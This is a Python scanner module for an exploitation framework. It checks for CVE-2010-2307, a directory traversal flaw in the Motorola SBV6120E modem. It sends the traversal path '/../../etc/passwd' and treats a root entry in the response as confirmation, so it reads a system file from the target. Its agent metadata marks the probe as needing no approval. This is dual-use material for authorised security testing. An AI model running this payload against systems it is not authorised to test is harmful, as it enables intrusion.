#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple directory traversal vulnerabilities in the web server for Motorola SURFBoard cable modem SBV6120E run."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Motorola SBV6120E SURFboard Digital Voice Modem SBV6X2X-1.0.0.5-SCM - Directory Traversal Detection',
        'description': 'Multiple directory traversal vulnerabilities in the web server for Motorola SURFBoard cable modem SBV6120E running firmware SBV6X2X-1.0.0.5-SCM-02-SHPC allow remote attackers to read arbitrary files via (1) "//" (multiple leading slash), (2) ../ (dot dot) sequences, and encoded dot dot sequences in a URL request.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'iot', 'lfi', 'motorola', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-2307',
            'https://www.exploit-db.com/exploits/12865',
            'http://www.exploit-db.com/exploits/12865',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/59113',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2010-2307',
    }

    def run(self):
        r = self.http_request(method="GET", path='/../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Motorola SBV6120E SURFboard Digital Voice Modem SBV6X2X-1.0.0.5-SCM - Directory Traversal detected",
                path='/../../etc/passwd',
            )
            return True
        return False

